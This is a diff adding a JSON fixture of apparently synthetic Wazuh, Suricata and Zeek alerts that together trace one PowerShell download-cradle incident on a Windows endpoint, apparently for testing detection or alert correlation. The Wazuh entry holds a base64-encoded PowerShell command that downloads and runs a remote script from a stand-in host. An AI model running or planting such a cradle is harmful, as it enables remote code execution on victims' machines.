@@ -1,0 +1,132 @@
+[
+    {
+      "id": "wazuh-powershell-001",
+      "source": "wazuh",
+      "timestamp": "2026-06-10T12:00:00Z",
+      "payload": {
+        "id": "wazuh-powershell-001",
+        "timestamp": "2026-06-10T12:00:00Z",
+        "agent": {
+          "id": "001",
+          "name": "endpoint-01",
+          "ip": "10.0.1.42",
+          "os": {
+            "name": "Windows 11"
+          }
+        },
+        "rule": {
+          "id": "92001",
+          "level": 12,
+          "description": "Suspicious PowerShell encoded command execution",
+          "groups": [
+            "windows",
+            "powershell",
+            "execution"
+          ]
+        },
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "4688",
+              "computer": "endpoint-01"
+            },
+            "eventdata": {
+              "targetUserName": "alice",
+              "newProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAgAC4AMgA1AC8AYQAvAHMAdABhAGcAZQAuAHAAcwAxACcAKQA="
+            }
+          },
+          "srcip": "10.0.1.42",
+          "dstip": "198.51.100.25"
+        },
+        "full_log": "PowerShell encoded command executed by alice on endpoint-01 and attempted outbound connection to 198.51.100.25"
+      }
+    },
+    {
+      "id": "so-suricata-001",
+      "source": "security_onion",
+      "timestamp": "2026-06-10T12:01:15Z",
+      "payload": {
+        "event": {
+          "id": "so-suricata-001",
+          "module": "suricata",
+          "dataset": "suricata.eve"
+        },
+        "@timestamp": "2026-06-10T12:01:15Z",
+        "source": {
+          "ip": "10.0.1.42",
+          "port": 49722
+        },
+        "destination": {
+          "ip": "198.51.100.25",
+          "port": 443
+        },
+        "host": {
+          "name": "securityonion-sensor-01"
+        },
+        "network": {
+          "protocol": "tcp",
+          "transport": "tcp"
+        },
+        "suricata": {
+          "eve": {
+            "event_type": "alert",
+            "alert": {
+              "signature_id": 2024218,
+              "signature": "ET TROJAN Possible PowerShell Download Cradle",
+              "category": "Trojan Activity",
+              "severity": 1
+            },
+            "flow": {
+              "pkts_toserver": 12,
+              "pkts_toclient": 9,
+              "bytes_toserver": 1840,
+              "bytes_toclient": 5212
+            }
+          }
+        },
+        "message": "ET TROJAN Possible PowerShell Download Cradle from 10.0.1.42 to 198.51.100.25"
+      }
+    },
+    {
+      "id": "so-zeek-dns-001",
+      "source": "security_onion",
+      "timestamp": "2026-06-10T12:01:40Z",
+      "payload": {
+        "event": {
+          "id": "so-zeek-dns-001",
+          "module": "zeek",
+          "dataset": "zeek.dns"
+        },
+        "@timestamp": "2026-06-10T12:01:40Z",
+        "source": {
+          "ip": "10.0.1.42"
+        },
+        "destination": {
+          "ip": "198.51.100.25"
+        },
+        "host": {
+          "name": "securityonion-sensor-01"
+        },
+        "dns": {
+          "question": {
+            "name": "stage-update.example.net"
+          },
+          "answers": [
+            "198.51.100.25"
+          ],
+          "type": "A"
+        },
+        "zeek": {
+          "dns": {
+            "uid": "C9x2Yh2mExample",
+            "query": "stage-update.example.net",
+            "answers": [
+              "198.51.100.25"
+            ]
+          }
+        },
+        "message": "Zeek DNS lookup from endpoint-01 for stage-update.example.net resolving to 198.51.100.25"
+      }
+    }
+  ]
